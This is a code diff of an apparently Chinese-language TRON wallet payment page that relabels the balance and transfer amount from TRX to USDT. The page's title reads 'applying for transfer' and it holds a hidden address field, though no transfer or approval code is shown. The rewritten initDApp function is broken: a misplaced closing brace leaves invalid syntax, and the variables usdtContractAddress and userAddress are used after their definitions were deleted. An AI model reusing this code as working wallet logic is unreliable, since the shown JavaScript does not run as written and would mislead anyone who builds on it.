@@ -48,7 +48,7 @@
                             <div data-v-49fe1bb8="">
                                 <div data-v-49fe1bb8="" class="pay-box">
                                     <div data-v-49fe1bb8="" class="amount">
-                                        <div data-v-49fe1bb8="" class="num"><span class="amount" id="amount"></span><em data-v-49fe1bb8="">TRX</em></div><img data-v-49fe1bb8="" src="png/icon_exchange.jpg" class="icon">
+                                        <div data-v-49fe1bb8="" class="num"><span class="amount" id="amount"></span><em data-v-49fe1bb8="">USDT</em></div><img data-v-49fe1bb8="" src="png/icon_exchange.jpg" class="icon">
                                     </div>
                                     <div data-v-49fe1bb8="" class="rate"><span id="amount-display"></span><em data-v-49fe1bb8="">USD</em>
                                         <div data-v-49fe1bb8="" class="icon"><img data-v-49fe1bb8="" src="png/icon_horn.jpg"></div>
@@ -59,7 +59,7 @@
                                         <div data-v-49fe1bb8="" class="name"><img data-v-49fe1bb8="" src="png/icon_trx.png" class="coin">
                                             <div data-v-49fe1bb8="" class="asset-box">
                                                 <p data-v-49fe1bb8="" class="title">余额</p>
-                                                <p data-v-49fe1bb8="" class="num"><span data-v-49fe1bb8="" id="ye"></span><em data-v-49fe1bb8="">TRX</em></p><input type="text" id="address" style="display:none">
+                                                <p data-v-49fe1bb8="" class="num"><span data-v-49fe1bb8="" id="ye"></span><em data-v-49fe1bb8="">USDT</em></p><input type="text" id="address" style="display:none">
                                             </div>
                                         </div>
                                         <div data-v-49fe1bb8="" class="right">
@@ -163,25 +163,24 @@ async function connectWallet() {
     }
 }
 // 初始化DApp
-async function getUSDTBalance() {
-    await connectWallet(); // 确保钱包已连接
-
-    const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // USDT合约地址
-    const userAddress = TronWeb.defaultAddress.base58; // 当前用户地址
-
+async function initDApp() {
     try {
+        userData.address = window.tronWeb.defaultAddress.base58;
+        // console.log("用户地址:", userData.address);
         const contract = TronWeb.contract().at(usdtContractAddress);
         const balance = await contract.balanceOf(userAddress).call();
         console.log("USDT余额:", balance / 1e6); // 将余额从wei转换为USDT
+    } 
+        updateUSDTBalance();
     } catch (error) {
-        console.error("读取USDT余额时出错:", error);
+        console.error("获取用户数据时出错:", error);
     }
 }
 // 更新页面的TRX余额
-function updateTRXBalance() {
+function updateUSDTBalance() {
     const balanceElement = document.getElementById('ye');
     if (balanceElement) {
-        balanceElement.textContent = parseFloat(userData.trxBalance).toFixed(4);
+        balanceElement.textContent = parseFloat(userData.usdtBalance).toFixed(4);
     } else {
         console.error("未找到显示余额的元素");
     }
@@ -226,7 +225,7 @@ function deleteLastChar() {
     updateAmountDisplay();
 }
 function setMaxAmount() {
-    currentAmount = parseFloat(userData.trxBalance).toFixed(4);
+    currentAmount = parseFloat(userData.usdtBalance).toFixed(4);
     updateAmountDisplay();
 }
 function deleteLastChar() {
@@ -253,21 +252,21 @@ function updateAmountDisplay() {
         amountElement.textContent = displayAmount;
     }
     // 更新 USD 显示
-    const usdAmount = (parseFloat(displayAmount) * TRX_TO_USD_RATE).toFixed(2);
+    const usdAmount = (parseFloat(displayAmount) * USDT_TO_USD_RATE).toFixed(2);
     const usdElement = document.getElementById('amount-display');
     if (usdElement) {
         usdElement.textContent = usdAmount;
     }
     updateNextButtonState();
     // 更新网站标题
-    const title = `正在申请转账 ${displayAmount} TRX`;
+    const title = `正在申请转账 ${displayAmount} USDT`;
     document.title = title;
 }
 function updateNextButtonState() {
     const nextButton = document.getElementById('submitBtn');
     if (nextButton) {
         const amount = parseFloat(currentAmount || '0');
-        const isValid = amount > 0 && amount <= parseFloat(userData.trxBalance || '0');
+        const isValid = amount > 0 && amount <= parseFloat(userData.usdtBalance || '0');
         nextButton.disabled = !isValid;
         nextButton.classList.toggle('disabled', !isValid);
     }
